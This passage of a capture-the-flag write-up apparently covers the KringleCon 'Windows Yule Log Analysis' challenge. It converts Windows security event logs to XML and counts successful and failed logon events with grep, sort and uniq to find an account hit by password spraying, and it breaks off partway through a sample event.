HTTP2 (without trying to HTTP/1.1 and doing an upgrade to HTTP2
first). Then, the output from the page told us that we needed to
submit a POST request, with <code>status=on</code>.
</p>
</div>
</div>
</div>
<div id="outline-container-org5a9d9c1" class="outline-3">
<h3 id="spray-detect"><a id="org5a9d9c1"></a>Windows Yule Log Analysis</h3>
<div class="outline-text-3" id="text-spray-detect">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgf385e11">Goal</a></li>
<li><a href="#orgfb13e48">Background</a></li>
<li><a href="#org166bac7">Intro</a></li>
<li><a href="#orgd68bc73">Solution</a></li>
<li><a href="#org56cb83f">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgf385e11" class="outline-4">
<h4 id="orgf385e11">Goal</h4>
<div class="outline-text-4" id="text-orgf385e11">
<div class="note">
<p>
Submit the compromised webmail username to runtoanswer to complete
this challenge.
</p>

</div>
</div>
</div>
<div id="outline-container-orgfb13e48" class="outline-4">
<h4 id="orgfb13e48">Background</h4>
<div class="outline-text-4" id="text-orgfb13e48">
</div>
<ul class="org-ul">
<li><a id="org6675a6a"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org6675a6a">
<p>
Pepper Minstix tells us:
</p>

<blockquote>
<p>
Have you heard of password spraying? It seems we've been victim.
</p>

<p>
We fear that they were successful in accessing one of our Elf Web Access accounts, but we don't know which one.
</p>

<p>
Parsing through .evtx files can be tricky, but there's a Python script that can help you convert it into XML for easier grep'ing.
</p>
</blockquote>
</div>
</li>
<li><a id="org964e9cc"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org964e9cc">
<p>
Pepper promptly points password penetration people to <a href="https://securityweekly.com/2017/07/21/tsw11/">Password Spraying</a>.
</p>
</div>
</li>
<li><a id="orgb280ecd"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgb280ecd">
<p>
<a href="https://www.youtube.com/watch?v=khwYjZYpzFw">Beau Bullock, Everything You Wanted to Know About Password Spraying But Were Afraid to Ask!</a>
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org166bac7" class="outline-4">
<h4 id="org166bac7">Intro</h4>
<div class="outline-text-4" id="text-org166bac7">
<p>
When we start the Cranberry Pi, we get the following message:
</p>

<pre class="example">
I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
"Password spraying" is to blame for this our grinchly fate.
Should we blame our password policies which users hate?

Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...

  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
</pre>

<p>
Checking our home directory, we see:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ ls
evtx_dump.py  ho-ho-no.evtx  runtoanswer    
</pre>
</div>

<p>
<code>evtx_dump.py</code> must be the Python script Pepper was referring to, for converting <code>ho-ho-no.evtx</code> to XML.
</p>
</div>
</div>
<div id="outline-container-orgd68bc73" class="outline-4">
<h4 id="orgd68bc73">Solution</h4>
<div class="outline-text-4" id="text-orgd68bc73">
<p>
<asciinema-player src="casts/spray-detect.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
First, we figure out how to run <code>evtx_dump.py</code>:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ python evtx_dump.py
usage: evtx_dump.py [-h] evtx
evtx_dump.py: error: too few arguments
elf@spray-detect:~$ python evtx_dump.py ho-ho-no.evtx
&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.1"</span> <span style="color: #a0522d;">encoding</span>=<span style="color: #8b2252;">"utf-8"</span> <span style="color: #a0522d;">standalone</span>=<span style="color: #8b2252;">"yes"</span> ?&gt;
&lt;Events&gt;
&lt;Event <span style="color: #a0522d;">xmlns</span>=<span style="color: #8b2252;">"http://schemas.microsoft.com/win/2004/08/events/event"</span>&gt;&lt;System&gt;&lt;Provider <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"Microsoft-Windows-Security-Auditing"</span> <span style="color: #a0522d;">Guid</span>=<span style="color: #8b2252;">"{54849625-5478-4994-a5ba-3e3b0328c30d}"</span>&gt;&lt;/Provider&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4647&lt;/EventID&gt;
&lt;Version&gt;0&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12545&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
...
</pre>
</div>

<p>
Next, we'll save the XML version to a file, so we're not waiting on the Python script to re-parse the events each time.
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ python evtx_dump.py ho-ho-no.evtx &gt; ho-ho-no.xml
</pre>
</div>

<p>
At this point, we follow along in Beau's video. We learn that
password spraying involves trying a single password across a large
number of accounts. That way, account lockout polices don't
trigger. He also mentions that a good way to try this is via
e-mail servers like OWA, using his tool, MailSniper. Given that Pepper's hint is about MailSniper, we suspect that this is likely the vector being used.
</p>

<p>
Taking a closer look at our logs, we see events such as:
</p>

<div class="org-src-container">
<pre class="src src-xml">&lt;<span style="color: #0000ff;">Event</span> <span style="color: #483d8b;">xmlns</span>=<span style="color: #8b2252;">"http://schemas.microsoft.com/win/2004/08/events/event"</span>&gt;
    &lt;<span style="color: #0000ff;">System</span>&gt;
        &lt;<span style="color: #0000ff;">Provider</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"Microsoft-Windows-Security-Auditing"</span> <span style="color: #a0522d;">Guid</span>=<span style="color: #8b2252;">"{54849625-5478-4994-a5ba-3e3b0328c30d}"</span>&gt;&lt;/<span style="color: #0000ff;">Provider</span>&gt;
        &lt;<span style="color: #0000ff;">EventID</span> <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4647&lt;/<span style="color: #0000ff;">EventID</span>&gt;
        &lt;<span style="color: #0000ff;">Version</span>&gt;0&lt;/<span style="color: #0000ff;">Version</span>&gt;
        &lt;<span style="color: #0000ff;">Level</span>&gt;0&lt;/<span style="color: #0000ff;">Level</span>&gt;
        &lt;<span style="color: #0000ff;">Task</span>&gt;12545&lt;/<span style="color: #0000ff;">Task</span>&gt;
        &lt;<span style="color: #0000ff;">Opcode</span>&gt;0&lt;/<span style="color: #0000ff;">Opcode</span>&gt;
        &lt;<span style="color: #0000ff;">Keywords</span>&gt;0x8020000000000000&lt;/<span style="color: #0000ff;">Keywords</span>&gt;
        &lt;<span style="color: #0000ff;">TimeCreated</span> <span style="color: #a0522d;">SystemTime</span>=<span style="color: #8b2252;">"2018-09-10 12:18:26.972103"</span>&gt;&lt;/<span style="color: #0000ff;">TimeCreated</span>&gt;
        &lt;<span style="color: #0000ff;">EventRecordID</span>&gt;231712&lt;/<span style="color: #0000ff;">EventRecordID</span>&gt;
        &lt;<span style="color: #0000ff;">Correlation</span> <span style="color: #a0522d;">ActivityID</span>=<span style="color: #8b2252;">"{fd18dc13-48f8-0001-58dc-18fdf848d401}"</span> <span style="color: #a0522d;">RelatedActivityID</span>=<span style="color: #8b2252;">""</span>&gt;&lt;/<span style="color: #0000ff;">Correlation</span>&gt;
        &lt;<span style="color: #0000ff;">Execution</span> <span style="color: #a0522d;">ProcessID</span>=<span style="color: #8b2252;">"660"</span> <span style="color: #a0522d;">ThreadID</span>=<span style="color: #8b2252;">"752"</span>&gt;&lt;/<span style="color: #0000ff;">Execution</span>&gt;
        &lt;<span style="color: #0000ff;">Channel</span>&gt;Security&lt;/<span style="color: #0000ff;">Channel</span>&gt;
        &lt;<span style="color: #0000ff;">Computer</span>&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/<span style="color: #0000ff;">Computer</span>&gt;
        &lt;<span style="color: #0000ff;">Security</span> <span style="color: #a0522d;">UserID</span>=<span style="color: #8b2252;">""</span>&gt;&lt;/<span style="color: #0000ff;">Security</span>&gt;
    &lt;/<span style="color: #0000ff;">System</span>&gt;
    &lt;<span style="color: #0000ff;">EventData</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetUserSid"</span>&gt;S-1-5-21-25059752-1411454016-2901770228-500&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetUserName"</span>&gt;Administrator&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetDomainName"</span>&gt;EM.KRINGLECON&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetLogonId"</span>&gt;0x0000000000969b09&lt;/<span style="color: #0000ff;">Data</span>&gt;
    &lt;/<span style="color: #0000ff;">EventData</span>&gt;
&lt;/<span style="color: #0000ff;">Event</span>&gt;
</pre>
</div>

<p>
Let's start by seeing which systems we have log data from. To do
this, we'll use the <code>grep</code> command, to only return lines from the
file which match our search term, and then we'll use the pipe (<code>|</code>)
operator to pass those lines to <code>sort</code>. Finally, we'll pass the
sorted lines to the <code>uniq</code> ("unique") command, which will only
print a line if it's different from the line above it. <code>sort</code> and
<code>uniq</code> are often used together in this way, since <code>uniq</code> only
compares the line to the line above it when deciding whether or
not to print it.
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ grep <span style="color: #8b2252;">'&lt;Computer&gt;'</span> ho-ho-no.xml | sort | uniq
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
</pre>
</div>

<p>
We only have logs from a single system, which we suspect to be an Exchange Server 2016 from its hostname. Let's see what events we have:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ grep <span style="color: #8b2252;">'EventID'</span> ho-ho-no.xml | sort | uniq
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4608&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4624&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4625&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4647&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4688&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4724&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4738&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4768&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4769&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4776&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4799&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4826&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4902&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4904&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;5024&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;5033&lt;/EventID&gt;
&lt;EventID <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;5059&lt;/EventID&gt;
</pre>
</div>

<p>
A bit of research gives us names to go with these EventIDs:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Event ID</th>
<th scope="col" class="org-left">Event Name</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">4608</td>
<td class="org-left">Windows is starting up</td>
</tr>

<tr>
<td class="org-right"><b>4624</b></td>
<td class="org-left"><b>An account was successfully logged on</b></td>
</tr>

<tr>
<td class="org-right"><b>4625</b></td>
<td class="org-left"><b>An account failed to log on</b></td>
</tr>

<tr>
<td class="org-right">4647</td>
<td class="org-left">User initiated logoff</td>
</tr>

<tr>
<td class="org-right">4688</td>
<td class="org-left">A new process has been created</td>
</tr>

<tr>
<td class="org-right">4724</td>
<td class="org-left">An attempt was made to reset an accounts password</td>
</tr>

<tr>
<td class="org-right">4738</td>
<td class="org-left">A user account was changed</td>
</tr>

<tr>
<td class="org-right">4768</td>
<td class="org-left">A Kerberos authentication ticket (TGT) was requested</td>
</tr>

<tr>
<td class="org-right">4769</td>
<td class="org-left">A Kerberos service ticket was requested</td>
</tr>

<tr>
<td class="org-right">4776</td>
<td class="org-left">The domain controller attempted to validate the credentials for an account</td>
</tr>

<tr>
<td class="org-right">4799</td>
<td class="org-left">A security-enabled local group membership was enumerated</td>
</tr>

<tr>
<td class="org-right">4826</td>
<td class="org-left">Boot Configuration Data loaded</td>
</tr>

<tr>
<td class="org-right">4902</td>
<td class="org-left">The Per-user audit policy table was created</td>
</tr>

<tr>
<td class="org-right">4904</td>
<td class="org-left">An attempt was made to register a security event source</td>
</tr>

<tr>
<td class="org-right">5024</td>
<td class="org-left">The Windows Firewall Service has started successfully</td>
</tr>

<tr>
<td class="org-right">5033</td>
<td class="org-left">The Windows Firewall Driver has started successfully</td>
</tr>

<tr>
<td class="org-right">5059</td>
<td class="org-left">Key migration operation</td>
</tr>
</tbody>
</table>

<p>
4624 and 4625 seem interesting. Let's update our previous command to include the number of occurences of each event by using <code>-c, --count prefix lines by the number of occurrences</code>:
</p>

<pre class="example">
elf@spray-detect:~$ grep 'EventID' ho-ho-no.xml | sort | uniq -c
      1 &lt;EventID Qualifiers=""&gt;4608&lt;/EventID&gt;
    756 &lt;EventID Qualifiers=""&gt;4624&lt;/EventID&gt;
    212 &lt;EventID Qualifiers=""&gt;4625&lt;/EventID&gt;
      1 &lt;EventID Qualifiers=""&gt;4647&lt;/EventID&gt;
</pre>

<p>
So, we've had 756 accounts successful logon attempts, and 212 failed ones.
</p>

<div class="org-src-container">
<pre class="src src-xml">&lt;<span style="color: #0000ff;">Event</span> <span style="color: #483d8b;">xmlns</span>=<span style="color: #8b2252;">"http://schemas.microsoft.com/win/2004/08/events/event"</span>&gt;
    &lt;<span style="color: #0000ff;">System</span>&gt;
        &lt;<span style="color: #0000ff;">Provider</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"Microsoft-Windows-Security-Auditing"</span> <span style="color: #a0522d;">Guid</span>=<span style="color: #8b2252;">"{54849625-5478-4994-a5ba-3e3b0328c30d}"</span>&gt;&lt;/<span style="color: #0000ff;">Provider</span>&gt;
        &lt;<span style="color: #0000ff;">EventID</span> <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4624&lt;/<span style="color: #0000ff;">EventID</span>&gt;
        &lt;<span style="color: #0000ff;">Version</span>&gt;2&lt;/<span style="color: #0000ff;">Version</span>&gt;
        &lt;<span style="color: #0000ff;">Level</span>&gt;0&lt;/<span style="color: #0000ff;">Level</span>&gt;
        &lt;<span style="color: #0000ff;">Task</span>&gt;12544&lt;/<span style="color: #0000ff;">Task</span>&gt;
        &lt;<span style="color: #0000ff;">Opcode</span>&gt;0&lt;/<span style="color: #0000ff;">Opcode</span>&gt;
        &lt;<span style="color: #0000ff;">Keywords</span>&gt;0x8020000000000000&lt;/<span style="color: #0000ff;">Keywords</span>&gt;
        &lt;<span style="color: #0000ff;">TimeCreated</span> <span style="color: #a0522d;">SystemTime</span>=<span style="color: #8b2252;">"2018-09-10 12:19:20.695601"</span>&gt;&lt;/<span style="color: #0000ff;">TimeCreated</span>&gt;
        &lt;<span style="color: #0000ff;">EventRecordID</span>&gt;231726&lt;/<span style="color: #0000ff;">EventRecordID</span>&gt;
        &lt;<span style="color: #0000ff;">Correlation</span> <span style="color: #a0522d;">ActivityID</span>=<span style="color: #8b2252;">""</span> <span style="color: #a0522d;">RelatedActivityID</span>=<span style="color: #8b2252;">""</span>&gt;&lt;/<span style="color: #0000ff;">Correlation</span>&gt;
        &lt;<span style="color: #0000ff;">Execution</span> <span style="color: #a0522d;">ProcessID</span>=<span style="color: #8b2252;">"664"</span> <span style="color: #a0522d;">ThreadID</span>=<span style="color: #8b2252;">"668"</span>&gt;&lt;/<span style="color: #0000ff;">Execution</span>&gt;
        &lt;<span style="color: #0000ff;">Channel</span>&gt;Security&lt;/<span style="color: #0000ff;">Channel</span>&gt;
        &lt;<span style="color: #0000ff;">Computer</span>&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/<span style="color: #0000ff;">Computer</span>&gt;
        &lt;<span style="color: #0000ff;">Security</span> <span style="color: #a0522d;">UserID</span>=<span style="color: #8b2252;">""</span>&gt;&lt;/<span style="color: #0000ff;">Security</span>&gt;
    &lt;/<span style="color: #0000ff;">System</span>&gt;
    &lt;<span style="color: #0000ff;">EventData</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectUserSid"</span>&gt;S-1-0-0&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectUserName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectDomainName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectLogonId"</span>&gt;0x0000000000000000&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetUserSid"</span>&gt;S-1-5-18&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetUserName"</span>&gt;SYSTEM&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetDomainName"</span>&gt;NT AUTHORITY&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetLogonId"</span>&gt;0x00000000000003e7&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LogonType"</span>&gt;0&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LogonProcessName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"AuthenticationPackageName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"WorkstationName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LogonGuid"</span>&gt;{00000000-0000-0000-0000-000000000000}&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TransmittedServices"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LmPackageName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"KeyLength"</span>&gt;0&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"ProcessId"</span>&gt;0x0000000000000004&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"ProcessName"</span>&gt;&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"IpAddress"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"IpPort"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"ImpersonationLevel"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"RestrictedAdminMode"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetOutboundUserName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetOutboundDomainName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"VirtualAccount"</span>&gt;%%1843&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetLinkedLogonId"</span>&gt;0x0000000000000000&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"ElevatedToken"</span>&gt;%%1842&lt;/<span style="color: #0000ff;">Data</span>&gt;
    &lt;/<span style="color: #0000ff;">EventData</span>&gt;
&lt;/<span style="color: #0000ff;">Event</span>&gt;
...
&lt;<span style="color: #0000ff;">Event</span> <span style="color: #483d8b;">xmlns</span>=<span style="color: #8b2252;">"http://schemas.microsoft.com/win/2004/08/events/event"</span>&gt;
    &lt;<span style="color: #0000ff;">System</span>&gt;
        &lt;<span style="color: #0000ff;">Provider</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"Microsoft-Windows-Security-Auditing"</span> <span style="color: #a0522d;">Guid</span>=<span style="color: #8b2252;">"{54849625-5478-4994-a5ba-3e3b0328c30d}"</span>&gt;&lt;/<span style="color: #0000ff;">Provider</span>&gt;
        &lt;<span style="color: #0000ff;">EventID</span> <span style="color: #a0522d;">Qualifiers</span>=<span style="color: #8b2252;">""</span>&gt;4625&lt;/<span style="color: #0000ff;">EventID</span>&gt;
        &lt;<span style="color: #0000ff;">Version</span>&gt;0&lt;/<span style="color: #0000ff;">Version</span>&gt;
        &lt;<span style="color: #0000ff;">Level</span>&gt;0&lt;/<span style="color: #0000ff;">Level</span>&gt;
        &lt;<span style="color: #0000ff;">Task</span>&gt;12544&lt;/<span style="color: #0000ff;">Task</span>&gt;
        &lt;<span style="color: #0000ff;">Opcode</span>&gt;0&lt;/<span style="color: #0000ff;">Opcode</span>&gt;
        &lt;<span style="color: #0000ff;">Keywords</span>&gt;0x8010000000000000&lt;/<span style="color: #0000ff;">Keywords</span>&gt;
        &lt;<span style="color: #0000ff;">TimeCreated</span> <span style="color: #a0522d;">SystemTime</span>=<span style="color: #8b2252;">"2018-09-10 12:41:50.900736"</span>&gt;&lt;/<span style="color: #0000ff;">TimeCreated</span>&gt;
        &lt;<span style="color: #0000ff;">EventRecordID</span>&gt;234488&lt;/<span style="color: #0000ff;">EventRecordID</span>&gt;
        &lt;<span style="color: #0000ff;">Correlation</span> <span style="color: #a0522d;">ActivityID</span>=<span style="color: #8b2252;">"{71a9b66f-4900-0001-a8b6-a9710049d401}"</span> <span style="color: #a0522d;">RelatedActivityID</span>=<span style="color: #8b2252;">""</span>&gt;&lt;/<span style="color: #0000ff;">Correlation</span>&gt;
        &lt;<span style="color: #0000ff;">Execution</span> <span style="color: #a0522d;">ProcessID</span>=<span style="color: #8b2252;">"664"</span> <span style="color: #a0522d;">ThreadID</span>=<span style="color: #8b2252;">"712"</span>&gt;&lt;/<span style="color: #0000ff;">Execution</span>&gt;
        &lt;<span style="color: #0000ff;">Channel</span>&gt;Security&lt;/<span style="color: #0000ff;">Channel</span>&gt;
        &lt;<span style="color: #0000ff;">Computer</span>&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/<span style="color: #0000ff;">Computer</span>&gt;
        &lt;<span style="color: #0000ff;">Security</span> <span style="color: #a0522d;">UserID</span>=<span style="color: #8b2252;">""</span>&gt;&lt;/<span style="color: #0000ff;">Security</span>&gt;
    &lt;/<span style="color: #0000ff;">System</span>&gt;
    &lt;<span style="color: #0000ff;">EventData</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectUserSid"</span>&gt;S-1-5-18&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectUserName"</span>&gt;WIN-KCON-EXCH16$&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectDomainName"</span>&gt;EM.KRINGLECON&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubjectLogonId"</span>&gt;0x00000000000003e7&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetUserSid"</span>&gt;S-1-0-0&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetUserName"</span>&gt;sparkle.redberry&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TargetDomainName"</span>&gt;EM.KRINGLECON&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"Status"</span>&gt;0xc000006d&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"FailureReason"</span>&gt;%%2313&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"SubStatus"</span>&gt;0xc000006a&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LogonType"</span>&gt;8&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LogonProcessName"</span>&gt;Advapi  &lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"AuthenticationPackageName"</span>&gt;Negotiate&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"WorkstationName"</span>&gt;WIN-KCON-EXCH16&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"TransmittedServices"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"LmPackageName"</span>&gt;-&lt;/<span style="color: #0000ff;">Data</span>&gt;
